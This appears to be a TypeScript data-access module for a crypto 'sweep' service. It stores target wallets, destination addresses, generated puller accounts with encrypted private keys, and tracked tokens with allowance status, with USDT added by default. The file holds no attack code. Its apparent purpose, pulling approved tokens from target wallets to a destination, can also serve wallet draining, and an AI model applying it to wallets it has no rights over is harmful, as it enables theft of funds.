import crypto from 'node:crypto';
import { privateKeyToAccount } from 'viem/accounts';
import { db, redis } from '../config/db';
import { encrypt, decrypt } from './encryption';
import { ENV } from '../config/env';

export interface Token { id: number; token: `0x${string}`; allowanceOk: boolean }

export interface Target {
  id: number;
  userId: number;
  target: `0x${string}`;
  destination: `0x${string}`;
  puller: `0x${string}` | null;
  pullerKey: `0x${string}` | null;
  instanceId: string | null;
  tokens: Token[];
}

export function newPuller(): { address: `0x${string}`; key: `0x${string}` } {
  const key = `0x${crypto.randomBytes(32).toString('hex')}` as `0x${string}`;
  return { address: privateKeyToAccount(key).address, key };
}

export async function upsertTarget(o: {
  userId: number; target: string; destination: string;
  puller: string; pullerKey: string; instanceId?: string | null;
}): Promise<number> {
  const client = await db.getClient();
  try {
    await client.query('BEGIN');

    // 1. Upsert target
    const { rows } = await client.query(
      `INSERT INTO sweep_targets
         (user_id, target_address, destination_address, puller_address, encrypted_puller_key, baw_instance_id, is_active)
       VALUES ($1,$2,$3,$4,$5,$6,true)
       ON CONFLICT (user_id, target_address) DO UPDATE SET
         destination_address = EXCLUDED.destination_address,
         puller_address = EXCLUDED.puller_address,
         encrypted_puller_key = EXCLUDED.encrypted_puller_key,
         baw_instance_id = COALESCE(EXCLUDED.baw_instance_id, sweep_targets.baw_instance_id),
         is_active = true
       RETURNING id`,
      [o.userId, o.target.toLowerCase(), o.destination.toLowerCase(),
       o.puller.toLowerCase(), encrypt(o.pullerKey), o.instanceId ?? null],
    );
    
    const targetId = rows[0].id as number;

    // 2. Automatically provision USDT as a default tracked token so listener.ts scan() works instantly
    const defaultToken = (ENV.USDT || '0x55d398326f99059ff775485246999027b3197955').toLowerCase();
    await client.query(
      `INSERT INTO target_tokens (target_id, token_address, allowance_ok) VALUES ($1, $2, false)
       ON CONFLICT (target_id, token_address) DO NOTHING`,
      [targetId, defaultToken]
    );

    await client.query('COMMIT');
    await redis.del('targets:ver');
    return targetId;
  } catch (e) {
    await client.query('ROLLBACK');
    throw e;
  } finally {
    client.release();
  }
}

export async function addToken(targetId: number, token: string) {
  await db.query(
    `INSERT INTO target_tokens (target_id, token_address) VALUES ($1,$2)
     ON CONFLICT (target_id, token_address) DO NOTHING`,
    [targetId, token.toLowerCase()]);
  await redis.del('targets:ver');
}

export async function findTarget(userId: number, target: string) {
  const { rows } = await db.query(
    `SELECT id FROM sweep_targets WHERE user_id=$1 AND target_address=$2 AND is_active`,
    [userId, target.toLowerCase()]);
  return rows[0]?.id as number | undefined;
}

export async function deactivate(userId: number, target: string) {
  await db.query(
    `UPDATE sweep_targets SET is_active=false WHERE user_id=$1 AND target_address=$2`,
    [userId, target.toLowerCase()]);
  await redis.del('targets:ver');
}

export async function setAllowanceOk(tokenId: number, ok: boolean) {
  await db.query(`UPDATE target_tokens SET allowance_ok=$1 WHERE id=$2`, [ok, tokenId]);
}

export async function listActive(userId?: number): Promise<Target[]> {
  const { rows } = await db.query(
    `SELECT t.*, COALESCE((SELECT json_agg(json_build_object('id',k.id,'token',k.token_address,
        'allowanceOk',k.allowance_ok)) FROM target_tokens k WHERE k.target_id=t.id),'[]') AS toks
     FROM sweep_targets t WHERE t.is_active ${userId ? 'AND t.user_id=$1' : ''}
     ORDER BY t.created_at`,
    userId ? [userId] : []);
  return rows.map(r => ({
    id: r.id,
    userId: Number(r.user_id),
    target: r.target_address,
    destination: r.destination_address,
    puller: r.puller_address,
    pullerKey: r.encrypted_puller_key ? (decrypt(r.encrypted_puller_key) as `0x${string}`) : null,
    instanceId: r.baw_instance_id,
    tokens: (r.toks as any[]).map(x => ({ id: x.id, token: x.token, allowanceOk: x.allowanceOk })),
  }));
}

export async function adminStats() {
  const { rows } = await db.query(`
    SELECT (SELECT COUNT(*) FROM authorized_users) AS users,
           (SELECT COUNT(*) FROM sweep_targets WHERE is_active) AS targets,
           (SELECT COUNT(*) FROM sweep_targets WHERE is_active AND puller_address IS NULL) AS orphans`);
  return rows[0];
}
